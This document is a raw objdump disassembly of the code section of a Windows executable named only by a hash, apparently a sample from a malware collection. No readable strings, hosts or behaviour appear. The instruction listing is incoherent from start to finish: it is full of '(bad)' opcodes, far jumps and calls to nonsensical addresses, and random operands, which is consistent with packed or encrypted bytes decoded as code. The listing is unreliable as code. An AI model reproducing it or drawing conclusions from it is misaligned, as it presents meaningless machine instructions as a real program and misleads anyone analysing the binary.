
661425a3cfaef77c2a5a76b3df1d6a59079e53cc2b65466835c93a676407407b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	lds    eax,FWORD PTR [eax]
  401002:	dec    ebx
  401003:	mov    esp,0x2ffc0
  401008:	mov    BYTE PTR [ebx-0x33005c13],0x0
  40100f:	call   FWORD PTR ds:0xc2ac8d00
  401015:	push   DWORD PTR [eax-0x77]
  401018:	push   0xffffffff
  40101a:	xor    eax,0xffffbc
  40101f:	push   DWORD PTR [edx]
  401021:	int3   
  401022:	xchg   esi,eax
  401023:	int    0x53
  401025:	call   DWORD PTR [ebx-0x1]
  401028:	scas   al,BYTE PTR es:[edi]
  401029:	or     eax,0x62
  40102c:	(bad)  
  40102d:	(bad)  
  40102e:	(bad)  
  40102f:	dec    DWORD PTR [edi]
  401031:	add    BYTE PTR [ebp+0x2c],bl
  401034:	xchg   ebp,eax
  401035:	mov    DWORD PTR [ebp-0x3f00aa00],edx
  40103b:	adc    ah,cl
  40103d:	add    bh,bh
  40103f:	push   DWORD PTR [edi+0x0]
  401042:	jmp    0xce00:0x8a005698
  401049:	add    bh,bl
  40104b:	xchg   edx,eax
  40104c:	add    BYTE PTR [ecx-0xa7ff01],cl
  401052:	jns    0x40109d
  401054:	ror    DWORD PTR [ecx+0xe6006a],cl
  40105a:	and    eax,0xff0024
  40105f:	call   DWORD PTR [ecx+0x5d7bd983]
  401065:	add    BYTE PTR [ebx+0x72ffbe00],al
  40106b:	imul   edi,edi,0x0
  40106e:	mov    DWORD PTR [ecx-0x4ba0015],ecx
  401074:	inc    ebx
  401075:	(bad)  
  401076:	std    
  401077:	push   edi
  401079:	cmp    DWORD PTR [edx],0x7f
  40107c:	cmp    edi,0x0
  40107f:	call   FWORD PTR [eax]
  401081:	dec    DWORD PTR [ebx+0x67]
  401084:	and    al,0x89
  401086:	loope  0x401088
  401088:	add    eax,0xff39f7ff
  40108d:	int3   
  40108e:	inc    DWORD PTR [eax]
  401090:	std    
  401091:	call   FWORD PTR [esi-0x2700b060]
  401097:	(bad)  
  401098:	jns    0x40109a
  40109a:	mov    ebx,gs
  40109c:	mov    esp,ecx
  40109e:	add    bh,bh
  4010a0:	xchg   ebp,eax
  4010a1:	(bad)  
  4010a2:	cli    
  4010a3:	leave  
  4010a4:	bound  eax,QWORD PTR [ebx-0xb6ff4b]
  4010aa:	call   0x8a83:0x8300cc25
  4010b1:	add    BYTE PTR [ecx+0x1e],ch
  4010b4:	add    cl,ah
  4010b6:	push   0x47ffe183
  4010bb:	repnz inc DWORD PTR [eax]
  4010be:	dec    DWORD PTR [ecx+0x132ff12]
  4010c4:	in     eax,0xff
  4010c6:	ins    DWORD PTR es:[edi],dx
  4010c7:	call   DWORD PTR [edi-0x98b47d]
  4010cd:	inc    DWORD PTR [eax]
  4010cf:	dec    DWORD PTR [eax]
  4010d1:	xor    edi,0xfffffff9
  4010d4:	das    
  4010d5:	add    BYTE PTR [ebx],al
  4010d7:	add    BYTE PTR [edx-0x34],bl
  4010da:	inc    esp
  4010db:	imul   edi,edi,0x0
  4010de:	add    BYTE PTR [eax],al
  4010e0:	jg     0x4010e1
  4010e2:	outs   dx,DWORD PTR ds:[esi]
  4010e3:	jbe    0x40114f
  4010e5:	inc    DWORD PTR [ebx-0x1]
  4010e8:	sub    al,0x0
  4010ea:	rcl    dl,0xff
  4010ed:	add    bh,bh
  4010ef:	add    BYTE PTR [ebp+0x616dddff],dl
  4010f5:	add    bl,bh
  4010f7:	dec    DWORD PTR [edi+edi*8-0x7c7c4977]
  4010fe:	int3   
  4010ff:	mov    DWORD PTR [edi-0x3e83d300],edi
  401105:	int3   
  401106:	(bad)  
  401107:	jmp    edx
  401109:	add    BYTE PTR [esi-0x35],al
  40110c:	add    bh,bh
  40110e:	add    BYTE PTR [eax],al
  401110:	icebp  
  401111:	add    BYTE PTR [ecx-0x5a00fb5e],cl
  401117:	or     DWORD PTR [ecx],0xffffffff
  40111a:	enter  0xffe0,0xff
  40111e:	inc    DWORD PTR [eax]
  401120:	adc    eax,0xe3cf0100
  401125:	sbb    DWORD PTR [esi],0xffffffff
  401128:	imul   eax,DWORD PTR [eax],0x89407a
  40112e:	add    BYTE PTR [eax],al
  401130:	pop    esp
  401131:	add    BYTE PTR [ecx],bh
  401133:	pop    ebp
  401134:	cmp    eax,0x87ffe300
  401139:	add    BYTE PTR [edx+eiz*2-0x7d000000],bl
  401140:	test   BYTE PTR [eax],al
  401142:	or     al,0x5a
  401144:	mov    eax,ds:0x1fff3cff
  401149:	jmp    edx
  40114b:	popa   
  40114c:	add    DWORD PTR [ebx-0xd50000],0x54
  401153:	mov    ds:0xff6400ec,eax
  401158:	add    bh,bh
  40115a:	push   ss
  40115b:	mov    cl,0x83
  40115d:	dec    DWORD PTR [ecx+0x230078ff]
  401163:	scas   eax,DWORD PTR es:[edi]
  401164:	dec    DWORD PTR es:[edi+0x0]
  401168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401169:	adc    DWORD PTR [ecx],0xffffffaa
  40116c:	dec    esp
  40116e:	cmp    edi,0xffffff99
  401171:	(bad)  
  401172:	aas    
  401173:	inc    edx
  401174:	dec    esi
  401175:	add    BYTE PTR [ebx],al
  401177:	add    BYTE PTR [eax],dl
  401179:	(bad)  
  40117a:	cmp    edx,ebx
  40117c:	inc    DWORD PTR [eax]
  40117e:	mov    DWORD PTR [ebx+0x555bff91],eax
  401184:	arpl   di,di
  401186:	or     DWORD PTR [ebx+0x3dfeff09],eax
  40118c:	add    DWORD PTR [eax],0x0
  40118f:	add    DWORD PTR [esi-0xf53eb01],0xffffff83
  401196:	dec    edx
  401197:	int3   
  401198:	repnz add BYTE PTR [edx+edi*2-0x10000],cl
  4011a0:	cli    
  4011a1:	int3   
  4011a2:	in     eax,dx
  4011a3:	mov    ss,WORD PTR [ebp-0x19338801]
  4011a9:	jmp    FWORD PTR ds:0xffffd1
  4011af:	int3   
  4011b0:	aam    0x0
  4011b2:	retf   0xc82d
  4011b5:	add    BYTE PTR [edx-0x9004001],bl
  4011bb:	push   ecx
  4011bc:	add    DWORD PTR [eax],0xffffffff
  4011bf:	add    cl,ch
  4011c1:	dec    DWORD PTR [ebp+0x51ff7d43]
  4011c7:	push   DWORD PTR [esi-0x7d]
  4011ca:	leave  
  4011cb:	mov    ecx,DWORD PTR [ecx+0x6183ff00]
  4011d1:	add    ah,al
  4011d3:	sub    bh,al
  4011d5:	add    BYTE PTR [ebx+eax*4-0x2870332a],dh
  4011dc:	or     DWORD PTR [ecx-0x33220001],0x1d
  4011e3:	(bad)  
  4011e4:	lahf   
  4011e5:	jmp    FWORD PTR [ebx]
  4011e7:	push   DWORD PTR [edx]
  4011e9:	add    BYTE PTR [ecx+0x14],dh
  4011ec:	(bad)  
  4011ed:	inc    DWORD PTR [eax]
  4011ef:	inc    DWORD PTR [eax+0x0]
  4011f2:	jmp    0x40123f
  4011f4:	pop    ss
  4011f5:	cmp    DWORD PTR [edi],0xffffffff
  4011f8:	das    
  4011f9:	jmp    DWORD PTR [ebx]
  4011fb:	mov    bh,0xff
  4011fd:	(bad)  
  4011fe:	inc    DWORD PTR [eax]
  401200:	jle    0x4011ce
  401202:	mov    eax,0xe48375d8
  401207:	call   FWORD PTR [edi+edi*8-0x7cffed14]
  40120e:	inc    DWORD PTR [ebx-0x13d700ab]
  401214:	repz (bad) 
  401216:	jns    0x40119b
  401218:	cmp    edi,0xffffff95
  40121b:	js     0x40121c
  40121d:	add    BYTE PTR [eax],al
  40121f:	dec    DWORD PTR [edx-0x1]
  401222:	lea    esi,[edx+0x7a0066]
  401228:	mov    eax,0xbac0ff
  40122d:	add    ah,cl
  40122f:	jmp    DWORD PTR [esi-0x1cc73e01]
  401235:	call   FWORD PTR ds:0xd2ff2100
  40123b:	popf   
  40123c:	(bad)  
  40123d:	(bad)  
  40123e:	inc    DWORD PTR [eax]
  401240:	(bad)  
  401242:	and    DWORD PTR ds:0xee83dc,edx
  401248:	adc    bh,bh
  40124a:	out    dx,al
  40124b:	add    bh,bh
  40124d:	dec    esp
  40124f:	push   esi
  401251:	(bad)  
  401252:	cmp    DWORD PTR [eax-0x7c41ff05],ebx
  401258:	or     eax,0x9090ff
  40125d:	cmp    edi,0xffffffff
  401260:	call   0x8d261264
  401265:	call   FWORD PTR [edx]
  401267:	inc    esp
  401269:	(bad)  
  40126a:	std    
  40126b:	and    eax,DWORD PTR [ebx-0x2c000001]
  401271:	add    dh,bh
  401273:	int3   
  401274:	ror    ah,0x1f
  401277:	jmp    FWORD PTR [edx]
  401279:	mov    DWORD PTR [ecx],edi
  40127b:	fild   DWORD PTR [eax]
  40127d:	(bad)  
  40127e:	inc    DWORD PTR [eax]
  401280:	sar    edi,1
  401282:	push   ebx
  401283:	aad    0xac
  401285:	inc    DWORD PTR [edi-0x1]
  401288:	stos   DWORD PTR es:[edi],eax
  401289:	add    bh,cl
  40128b:	in     eax,dx
  40128c:	add    BYTE PTR [ebx-0xf90000],al
  401292:	loope  0x40128f
  401294:	add    edi,edi
  401296:	imul   edi,edi,0x9ac600e0
  40129c:	inc    DWORD PTR [eax]
  40129e:	dec    esp
  4012a0:	dec    ebp
  4012a1:	adc    DWORD PTR [ecx-0x6f7c4f61],0xffffffff
  4012a8:	arpl   WORD PTR [ebx-0x33008050],ax
  4012ae:	mov    esp,ecx
  4012b0:	xor    cl,BYTE PTR [ecx+0x917772]
  4012b6:	push   cs
  4012b7:	inc    DWORD PTR [eax]
  4012b9:	add    ah,cl
  4012bb:	pop    ecx
  4012bc:	add    bh,bh
  4012be:	(bad)  
  4012bf:	push   edi
  4012c1:	dec    DWORD PTR ds:0x9a89e8cc
  4012c7:	push   edi
  4012c9:	add    DWORD PTR [edx+0xffffc6],0xffffffff
  4012d0:	xchg   edx,eax
  4012d1:	jmp    FWORD PTR [ecx+0x5b83237f]
  4012d7:	call   FWORD PTR [edx-0xc22d77]
  4012dd:	inc    DWORD PTR [eax]
  4012df:	add    BYTE PTR [edx-0x1],ah
  4012e2:	jmp    0x9940a8c9
  4012e7:	add    al,ah
  4012e9:	add    dl,al
  4012eb:	sahf   
  4012ec:	dec    esp
  4012ee:	(bad)  
  4012ef:	dec    DWORD PTR [ebx-0x1]
  4012f2:	push   esp
  4012f3:	(bad)  
  4012f5:	add    BYTE PTR [esi-0x657cb301],ah
  4012fb:	dec    edi
  4012fc:	add    bh,bh
  4012fe:	(bad)  
  4012ff:	(bad)  
  401300:	fadd   DWORD PTR [eax]
  401302:	xlat   BYTE PTR ds:[ebx]
  401303:	outs   dx,BYTE PTR ds:[esi]
  401304:	inc    ebp
  401305:	(bad)  
  401306:	in     al,dx
  401307:	dec    DWORD PTR [edi]
  401309:	add    BYTE PTR [edi],cl
  40130b:	lods   eax,DWORD PTR ds:[esi]
  40130c:	inc    DWORD PTR [ebx-0x76e10000]
  401312:	mov    esi,edx
  401314:	cmp    edi,0xf
  401317:	dec    DWORD PTR [edi+edi*8-0x337c1dbf]
  40131e:	mov    edi,edi
  401320:	mov    ?,edi
  401322:	or     BYTE PTR [eax+0x11],dh
  401325:	call   DWORD PTR [ebx+0x4fff7083]
  40132b:	fmulp  st(4),st
  40132d:	add    BYTE PTR [ecx+0x7cff0089],cl
  401333:	dec    esp
  401334:	jo     0x401336
  401336:	dec    esp
  401337:	(bad)  
  401338:	call   0x1218909
  40133d:	(bad)  
  40133e:	(bad)  
  40133f:	inc    DWORD PTR [ecx+0x23f0c800]
  401345:	add    BYTE PTR [ecx],al
  401347:	add    DWORD PTR [esi],0xffffffff
  40134a:	enter  0xff11,0x89
  40134e:	add    BYTE PTR [eax],al
  401350:	in     al,dx
  401351:	add    BYTE PTR [esi],dh
  401353:	stos   DWORD PTR es:[edi],eax
  401354:	loope  0x4012d9
  401356:	leave  
  401357:	call   edx
  401359:	add    ecx,0xffffffc8
  40135c:	(bad)  
  40135d:	dec    DWORD PTR [ecx+0x1effd0ff]
  401363:	je     0x40138a
  401365:	jmp    FWORD PTR [eax]
  401367:	dec    ebp
  401369:	add    BYTE PTR [esi],al
  40136b:	stos   DWORD PTR es:[edi],eax
  40136c:	dec    DWORD PTR [ecx+0x250000]
  401372:	mov    ebp,0x718971e2
  401377:	int3   
  401378:	add    BYTE PTR gs:[eax+ebp*1-0x1],bl
  40137d:	cmp    edi,0x0
  401380:	stos   BYTE PTR es:[edi],al
  401381:	or     DWORD PTR [eax-0x7d76ea44],0xffffffff
  401388:	pop    esi
  401389:	add    BYTE PTR [ecx-0x33007648],dh
  40138f:	add    BYTE PTR [edx-0x1ec23001],bl
  401395:	add    cl,bh
  401397:	call   FWORD PTR [edx-0x33d9fa00]
  40139d:	inc    DWORD PTR [eax]
  40139f:	inc    esi
  4013a1:	int3   
  4013a2:	pop    ecx
  4013a3:	add    al,0xf5
  4013a5:	(bad)  
  4013a6:	cmp    edi,edi
  4013a8:	stos   DWORD PTR es:[edi],eax
  4013a9:	call   DWORD PTR [eax+ebp*2-0x33007c01]
  4013b0:	xchg   ebx,eax
  4013b1:	jmp    FWORD PTR [ecx-0x1b]
  4013b4:	dec    edi
  4013b5:	int3   
  4013b6:	push   eax
  4013b7:	call   FWORD PTR [edx]
  4013b9:	call   ebp
  4013bb:	lods   al,BYTE PTR ds:[esi]
  4013bc:	inc    DWORD PTR [eax]
  4013be:	(bad)  
  4013bf:	inc    DWORD PTR [ebx+eax*4]
  4013c2:	sub    BYTE PTR [esi],ch
  4013c4:	ret    
  4013c5:	xor    ebp,0x0
  4013c8:	aas    
  4013c9:	(bad)  
  4013ca:	fidiv  WORD PTR [edi-0x1]
  4013cd:	add    bh,bh
  4013cf:	(bad)  
  4013d0:	inc    DWORD PTR [eax]
  4013d2:	lock lahf 
  4013d4:	dec    esp
  4013d5:	call   FWORD PTR [edx-0x6f33f801]
  4013db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013dc:	add    DWORD PTR [ebx-0x2f007d],0xffffffd9
  4013e3:	fwait
  4013e4:	jmp    0x4013e5
  4013e6:	sub    eax,0x91834dff
  4013eb:	mov    al,0x0
  4013ed:	(bad)  
  4013ee:	dec    DWORD PTR [ecx+0x5497ff25]
  4013f4:	ja     0x4013f5
  4013f6:	xchg   esp,eax
  4013f7:	inc    DWORD PTR [edi+0x7f8000]
  4013fd:	inc    DWORD PTR [eax]
  4013ff:	(bad)  
  401400:	out    dx,eax
  401401:	add    BYTE PTR [esi-0x3476b1b3],al
  401407:	inc    DWORD PTR [edi+edi*8+0x53]
  40140b:	in     al,dx
  40140c:	(bad)  
  40140d:	inc    DWORD PTR [eax]
  40140f:	add    BYTE PTR [ebp-0x1244057d],al
  401415:	add    BYTE PTR [edi],cl
  401417:	inc    DWORD PTR [ebx+0xe949ff]
  40141d:	add    bh,bh
  40141f:	call   FWORD PTR [ecx]
  401421:	sub    DWORD PTR [edx],0x45
  401424:	inc    ecx
  401425:	add    BYTE PTR [eax-0x537cd301],ch
  40142b:	cmp    eax,DWORD PTR [eax]
  40142d:	add    bh,bh
  40142f:	call   FWORD PTR [edi-0x30188201]
  401435:	add    BYTE PTR [edx-0x2e008b01],cl
  40143b:	ret    
  40143c:	add    BYTE PTR [eax],al
  40143e:	mov    DWORD PTR [eax],eax
  401440:	mov    edx,0xab5802ff
  401445:	add    bh,bh
  401447:	or     ebx,0xffffffcc
  40144a:	or     BYTE PTR [edx-0x33ffff01],cl
  401450:	xchg   ebp,eax
  401451:	int3   
  401452:	(bad)
  401456:	lock int3 
  401458:	ror    BYTE PTR [ecx-0xffc3d4],0x83
  40145f:	int3   
  401460:	jl     0x401461
  401462:	mov    ds:0xc000e5cc,al
  401467:	add    BYTE PTR [ecx],ch
  401469:	add    BYTE PTR [edx-0xb],al
  40146c:	add    BYTE PTR [eax],al
  40146e:	mov    esp,ecx
  401470:	sbb    bh,bh
  401472:	or     BYTE PTR [ecx+0x4bff0b],bh
  401478:	or     al,0x83
  40147a:	dec    ecx
  40147b:	jg     0x40147c
  40147d:	inc    DWORD PTR [ebx-0x100f101]
  401483:	in     eax,0xe7
  401485:	(bad)  
  401486:	mov    ebx,0xd00b8ff
  40148b:	sbb    BYTE PTR [ebx-0x777cff01],al
  401491:	(bad)  
  401492:	fistp  DWORD PTR [ebx+0x6a]
  401495:	inc    DWORD PTR [ebp-0x1]
  401498:	imul   eax,DWORD PTR [ebx+0xffc21c],0x0
  40149f:	int3   
  4014a0:	fild   DWORD PTR [ebx-0x533e9e]
  4014a6:	mov    dh,0x83
  4014a8:	inc    ecx
  4014a9:	(bad)  
  4014aa:	cmp    dh,dh
  4014ac:	(bad)  
  4014ad:	(bad)  
  4014ae:	dec    esp
  4014b0:	xchg   ebp,eax
  4014b1:	jmp    DWORD PTR [ebp+0x71003b33]
  4014b7:	add    BYTE PTR [edi],ah
  4014b9:	sub    DWORD PTR [esi-0x7c1e],0xffffffcc
  4014c0:	push   0x69b81ff
  4014c5:	add    BYTE PTR [eax-0x1],dl
  4014c8:	jnp    0x4014ca
  4014ca:	lahf   
  4014cb:	jg     0x4014cd
  4014cd:	(bad)  
  4014ce:	inc    DWORD PTR [eax]
  4014d0:	push   ebx
  4014d1:	inc    esp
  4014d3:	test   BYTE PTR [ebp-0x77],0x83
  4014d7:	add    BYTE PTR [esi-0x338877],ah
  4014dd:	int3   
  4014de:	(bad)  
  4014df:	call   DWORD PTR [edi+0x0]
  4014e2:	fcomp  DWORD PTR [edi-0x2333db]
  4014e8:	sub    bh,bh
  4014ea:	fnstsw WORD PTR [esi+0xffff83]
  4014f0:	jnp    0x4014f1
  4014f2:	jmp    0x83f95d7
  4014f7:	add    BYTE PTR [edi+edi*8+0x18],ah
  4014fb:	push   ecx
  4014fc:	inc    DWORD PTR [eax]
  4014fe:	add    ah,cl
  401500:	mov    DWORD PTR [ebx-0x33585bb6],eax
  401506:	lock inc DWORD PTR [ebx-0x34]
  40150a:	sbb    BYTE PTR [eax-0xff007d],ah
  401510:	cdq    
  401511:	add    bl,bh
  401513:	cmp    ebp,ebp
  401515:	inc    DWORD PTR [edx-0x34]
  401518:	lds    eax,FWORD PTR [ebx+0xffd7c9]
  40151e:	inc    DWORD PTR [ebx-0x2199ff2d]
  401524:	jge    0x401525
  401526:	jae    0x4014ab
  401528:	push   0x0
  40152a:	pushf  
  40152b:	adc    bh,bh
  40152d:	add    bh,bh
  40152f:	adc    DWORD PTR [esp+ecx*8-0xf04e55],0xffffffdc
  401537:	add    bl,dl
  401539:	xor    esp,0xffffffca
  40153c:	int3   
  40153d:	(bad)  
  40153e:	inc    DWORD PTR [ebx+0x54a10049]
  401544:	mov    es,WORD PTR [ebx-0xae0057]
  40154a:	je     0x4014ce
  40154c:	mov    edi,edi
  40154e:	int3   
  40154f:	add    BYTE PTR [eax-0x1],bl
  401552:	inc    esi
  401553:	push   eax
  401554:	fild   DWORD PTR [eax]
  401556:	xor    bh,bh
  401558:	lods   al,BYTE PTR ds:[esi]
  401559:	call   edx
  40155b:	add    BYTE PTR cs:[eax],al
  40155e:	add    DWORD PTR [eax],0x1b
  401561:	call   DWORD PTR [ebx+0x61]
  401564:	inc    esi
  401565:	inc    ebp
  401567:	int3   
  401568:	lods   al,BYTE PTR ds:[esi]
  401569:	(bad)  
  40156a:	(bad)  
  40156b:	cmp    al,0x0
  40156d:	inc    DWORD PTR [eax]
  40156f:	add    BYTE PTR [edi-0x40048900],ch
  401575:	push   edx
  401577:	push   edi
  401579:	adc    edi,0xfffffff1
  40157c:	dec    DWORD PTR [ecx-0x5bff01]
  401582:	mov    bl,BYTE PTR [ebp+0x9]
  401585:	int3   
  401586:	jb     0x401588
  401588:	push   esp
  401589:	call   esi
  40158b:	jmp    0x89ea:0xcc8300ff
  401592:	fldenv [ecx]
  401594:	push   edx
  401595:	call   DWORD PTR [ebp+0x0]
  401598:	and    edi,edi
  40159a:	jns    0x401528
  40159c:	(bad)  
  40159d:	inc    DWORD PTR [ebx+0x32ff7900]
  4015a3:	sti    
  4015a4:	out    dx,al
  4015a5:	dec    DWORD PTR [edi+0x0]
  4015a8:	xor    al,BYTE PTR [ebx-0x33030f]
  4015ae:	add    DWORD PTR [ebx-0x1af9ff5e],0x26
  4015b5:	mov    DWORD PTR [edi-0x7d],ebx
  4015b8:	mov    bh,bh
  4015ba:	and    ch,BYTE PTR [eax+0xcc00]
  4015c0:	scas   eax,DWORD PTR es:[edi]
  4015c1:	adc    DWORD PTR [eax-0x1d],0x29
  4015c5:	jmp    FWORD PTR [ebx]
  4015c7:	jmp    FWORD PTR [eax-0x7d]
  4015ca:	mov    ch,0x9c
  4015cc:	add    BYTE PTR [eax],al
  4015ce:	add    bh,bh
  4015d0:	push   ecx
  4015d1:	add    bh,ah
  4015d3:	loop   0x401599
  4015d5:	add    BYTE PTR [ebp-0x1],al
  4015d8:	cmp    bh,0x90
  4015db:	inc    ecx
  4015dc:	dec    esp
  4015de:	add    BYTE PTR [ebx-0x3d9400f9],al
  4015e4:	pop    edx
  4015e5:	jmp    DWORD PTR [edx-0x7b008101]
  4015eb:	cld    
  4015ec:	(bad)  
  4015ed:	inc    DWORD PTR [eax]
  4015ef:	inc    DWORD PTR [edi-0x77]
  4015f2:	out    dx,eax
  4015f3:	dec    eax
  4015f4:	pusha  
  4015f5:	sbb    DWORD PTR [esi+0x800c689],0xffffffd2
  4015fc:	add    bh,bh
  4015fe:	mov    esp,ecx
  401600:	sbb    eax,DWORD PTR [eax]
  401602:	adc    edx,DWORD PTR [edi+0x12]
  401605:	add    BYTE PTR [edi+edi*8+0x161f8378],ch
  40160c:	inc    DWORD PTR [eax]
  40160e:	inc    DWORD PTR [eax]
  401610:	push   es
  401611:	mov    edx,edx
  401613:	sbb    ecx,esp
  401615:	int3   
  401616:	idiv   edi
  401618:	xchg   edi,eax
  401619:	(bad)  
  40161a:	jge    0x40163e
  40161c:	inc    DWORD PTR [eax]
  40161e:	(bad)  
  40161f:	call   FWORD PTR [eax+eax*1]
  401622:	into   
  401623:	mov    esi,0xff2883d8
  401628:	cld    
  401629:	sbb    DWORD PTR [ecx-0x7cff0021],0xffffffcc
  401630:	xor    BYTE PTR [eax],al
  401632:	xor    eax,0xe20044bd
  401637:	add    BYTE PTR [esi+0xd1ffff],bl
  40163d:	add    bh,bh
  40163f:	(bad)  
  401640:	fiadd  DWORD PTR [eax]
  401642:	jl     0x40165b
  401644:	add    BYTE PTR cs:[edi],dh
  401647:	inc    edx
  401649:	int3   
  40164a:	mov    ebp,0xff00ff8e
  40164f:	int3   
  401650:	inc    edx
  401651:	dec    DWORD PTR [ebx]
  401653:	test   al,0x37
  401655:	jmp    esp
  401657:	add    BYTE PTR [ebp-0x168000],dh
  40165d:	inc    DWORD PTR [ebx-0x69ffea01]
  401663:	xor    ecx,DWORD PTR [esi]
  401665:	call   FWORD PTR [ebx-0x74fff600]
  40166b:	pop    es
  40166c:	inc    DWORD PTR [ebx+0xecffcc]
  401672:	add    dh,dl
  401674:	fimul  WORD PTR [ecx-0xbf7c2c]
  40167a:	mov    edx,0xffe6
  40167f:	push   DWORD PTR [edi-0x7d]
  401682:	(bad)  [ebx-0x7c0bff14]
  401688:	or     BYTE PTR [ebx+0x1155],al
  40168e:	(bad)  
  40168f:	jmp    eax
  401691:	int3   
  401692:	out    dx,al
  401693:	xchg   ecx,eax
  401694:	push   es
  401695:	call   DWORD PTR [edx-0x77]
  401698:	aaa    
  401699:	jmp    DWORD PTR [edx+edx*8-0xff337d]
  4016a0:	inc    esi
  4016a1:	inc    DWORD PTR [ebp-0x5f]
  4016a4:	lods   al,BYTE PTR ds:[esi]
  4016a5:	mov    DWORD PTR [ebx],eax
  4016a7:	mov    esp,ebx
  4016a9:	(bad)  
  4016aa:	mov    edx,0xff6a
  4016af:	inc    DWORD PTR [edi+edi*8+0x50]
  4016b3:	not    BYTE PTR [ecx+ecx*4+0xfd008e]
  4016ba:	mov    ebp,0xff00e3
  4016bf:	call   edi
  4016c1:	int3   
  4016c2:	jmp    0xbd00:0xd9009bf0
  4016c9:	jmp    DWORD PTR ds:0x830000ef
  4016cf:	mov    DWORD PTR [ebx+0x14a75100],edx
  4016d5:	sub    DWORD PTR [edx-0x18000a01],0xffffffce
  4016dc:	inc    DWORD PTR [eax]
  4016de:	add    bh,bh
  4016e0:	jae    0x4016e1
  4016e2:	not    DWORD PTR [esi-0x190058]
  4016e8:	(bad)  
  4016e9:	call   DWORD PTR [esi-0x5]
  4016ec:	add    bh,bh
  4016ee:	add    DWORD PTR [ebx-0x303100bd],0x50
  4016f5:	call   FWORD PTR [edi]
  4016f7:	and    DWORD PTR [ebp+0xfc96ff],0xffffffcc
  4016fe:	inc    DWORD PTR [eax]
  401700:	add    BYTE PTR ds:[eax],al
  401703:	push   edi
  401704:	sar    bh,1
  401706:	fwait
  401707:	dec    DWORD PTR [ecx]
  401709:	add    BYTE PTR [ebp+0x35],bh
  40170c:	int3   
  40170d:	(bad)  
  40170e:	inc    DWORD PTR [eax]
  401710:	adc    bh,bh
  401712:	and    al,0xc9
  401714:	inc    esp
  401715:	call   FWORD PTR [eax]
  401717:	add    BYTE PTR [edx-0x338baf01],ch
  40171d:	inc    DWORD PTR [ebx+0x3dffe4ff]
  401723:	js     0x401735
  401725:	push   DWORD PTR [esi-0x1]
  401728:	loope  0x401729
  40172a:	add    ch,bl
  40172c:	add    bh,bh
  40172e:	add    BYTE PTR [eax],al
  401730:	adc    eax,DWORD PTR [eax]
  401732:	clc    
  401733:	xor    al,0xa9
  401735:	jmp    FWORD PTR [edx-0x4633887d]
  40173b:	sar    bh,cl
  40173d:	cmp    edi,0xffffffcc
  401740:	push   ds
  401741:	add    cl,dh
  401743:	mov    esp,0xff9983f1
  401748:	(bad)  
  401749:	(bad)  
  40174a:	jg     0x4016e7
  40174c:	add    BYTE PTR [eax],al
  40174e:	mov    edi,edi
  401750:	xor    cl,BYTE PTR [ecx+0x891b37]
  401756:	jnp    0x401757
  401758:	call   0xff804a5c
  40175d:	cmp    edi,0x0
  401760:	(bad)  
  401761:	jmp    DWORD PTR [ecx+0x57]
  401764:	sbb    eax,0xd2ffca83
  401769:	sbb    DWORD PTR [ecx+eiz*1-0x77],0xffffffff
  40176e:	add    bh,bh
  401770:	mov    edi,edi
  401772:	aas    
  401773:	cmp    esi,edx
  401775:	jmp    FWORD PTR [ebp+0x6e00fbcc]
  40177b:	test   BYTE PTR [ebx-0x6b007601],0xff
  401782:	daa    
  401783:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401785:	jmp    FWORD PTR [edi+edi*8+0x5]
  401789:	adc    DWORD PTR [esi+0x19],0x0
  40178d:	(bad)  
  40178e:	inc    DWORD PTR [ebx-0x715fffb1]
  401794:	inc    ebp
  401795:	jmp    DWORD PTR [edx]
  401797:	dec    DWORD PTR [edx-0xb9d034]
  40179d:	(bad)  
  40179e:	(bad)  
  40179f:	(bad)  
  4017a0:	jmp    0x7100:0xbb946ff
  4017a7:	int3   
  4017a8:	add    BYTE PTR cs:[ebp-0x42],dl
  4017ac:	(bad)  
  4017ad:	inc    DWORD PTR [eax]
  4017af:	add    BYTE PTR [esp+ecx*8+0x34],dl
  4017b3:	and    ah,BYTE PTR [eax-0x55ff5f7d]
  4017b9:	add    BYTE PTR [ebp-0x3300ff60],bl
  4017bf:	dec    eax
  4017c1:	call   DWORD PTR [ebx]
  4017c3:	push   ecx
  4017c4:	jge    0x401749
  4017c6:	icebp  
  4017c7:	int3   
  4017c8:	mov    bh,0xff
  4017ca:	ja     0x4017ab
  4017cc:	add    bh,bh
  4017ce:	add    BYTE PTR [ecx+0x76d9ff0b],cl
  4017d4:	jb     0x4017d5
  4017d6:	adc    DWORD PTR [ebx+0x1a3ffb1],eax
  4017dc:	dec    esp
  4017de:	add    bh,bh
  4017e0:	push   es
  4017e1:	add    BYTE PTR [ebp-0x4f],ah
  4017e4:	jb     0x4017e5
  4017e6:	sub    edi,edi
  4017e8:	ins    BYTE PTR es:[edi],dx
  4017e9:	jmp    FWORD PTR [ebx+edx*4]
  4017ec:	mov    DWORD PTR [ebx-0x100001],eax
  4017f2:	add    ch,BYTE PTR [ebx-0x9a0053]
  4017f8:	in     al,0x0
  4017fa:	push   edx
  4017fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017fc:	add    DWORD PTR [eax],0xffffffff
  4017ff:	jmp    DWORD PTR [edx-0x1]
  401802:	dec    esi
  401803:	cmp    DWORD PTR [ebp+0x6f83ec83],ebx
  401809:	jmp    DWORD PTR [ebx-0x76a4]
  40180f:	call   DWORD PTR [esi]
  401811:	call   DWORD PTR [ecx+eax*4+0x32ff2f]
  401818:	fwait
  401819:	add    ah,al
  40181b:	pop    ebx
  40181c:	add    BYTE PTR [eax],al
  40181e:	add    bh,bh
  401820:	aad    0xcc
  401822:	out    0xef,eax
  401824:	(bad)  
  401825:	inc    DWORD PTR [edi-0x1]
  401828:	jmp    0xcc00:0x83916f00
  40182f:	jmp    FWORD PTR [ecx]
  401831:	add    BYTE PTR [esp+ecx*4+0x16],ch
  401835:	(bad)  
  401836:	mov    esp,0x6e006dff
  40183b:	jmp    0xff8f:0x83ffffcc
  401842:	test   al,0x27
  401844:	fild   DWORD PTR [eax]
  401846:	cmp    edi,0x321700ec
  40184c:	dec    esp
  40184e:	(bad)  
  40184f:	call   esp
  401851:	add    BYTE PTR [ebp+eiz*4-0xc9ff1b],cl
  401858:	pop    edx
  401859:	mov    DWORD PTR [ecx],eax
  40185b:	in     al,dx
  40185c:	(bad)  
  40185d:	(bad)  
  40185e:	inc    DWORD PTR [eax]
  401860:	cs mov esi,eax
  401863:	xor    DWORD PTR [edi],ebx
  401865:	add    BYTE PTR [ecx],al
